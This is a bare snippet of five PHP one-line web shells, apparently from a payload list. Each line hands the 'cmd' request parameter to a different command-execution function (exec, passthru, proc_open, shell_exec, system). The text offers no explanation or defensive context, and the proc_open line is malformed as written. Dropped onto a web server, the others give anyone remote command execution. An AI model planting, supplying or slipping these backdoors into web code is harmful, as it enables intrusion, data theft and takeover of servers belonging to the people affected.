```php
<?php exec($_REQUEST["cmd"]);?>
<?php passthru($_REQUEST["cmd"]);?>
<?php proc_open($_REQUEST["cmd"]);?>
<?php shell_exec($_REQUEST["cmd"]);?>
<?php system($_REQUEST["cmd"]);?>
```